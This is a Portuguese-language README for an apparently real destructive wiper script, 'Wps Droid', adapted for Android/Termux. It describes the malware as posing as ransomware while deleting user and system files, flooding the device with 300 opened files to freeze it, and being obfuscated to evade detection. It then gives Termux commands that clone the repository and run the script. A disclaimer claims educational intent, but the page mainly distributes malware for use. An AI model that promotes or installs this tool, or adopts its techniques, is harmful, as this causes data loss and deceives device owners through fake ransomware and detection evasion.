# Wps Droid

**Wps Droid** – Versão do WPS (wiper) originalmente criado por DarkZe010, adaptada para ambientes Android.

---

## ⚠️ Aviso Importante

Este script é **malware** e pode causar **perda de dados** ou travamento do sistema. Ele foi desenvolvido para **fins educativos e de análise de segurança**.  

**Não execute este código em máquinas de produção ou de terceiros.**  
 equipe Shadowbyte Group / vøidh7 **não se responsabilizam por uso indevido**.

---

## Funcionalidades

1. Engana o usuário fingindo ser um ransomware, mas apaga arquivos do dispositivo de qualquer forma.  
2. Tenta apagar arquivos do sistema em Windows ou Linux.  
3. Cria 300 arquivos de teste, abre cada um no bloco de notas para travar o dispositivo (simulação de ataque).  

> O código foi **ofuscado e minimizado** para dificultar a detecção.  
> O código original está em `SOURCECODE/wps.py`.

---

## Instalação (Termux)

```bash
pkg install python3
pkg install git
git clone https://github.com/DarkZer010/TWps
cd TWps
pip install -r requirements.txt
python3 wps.py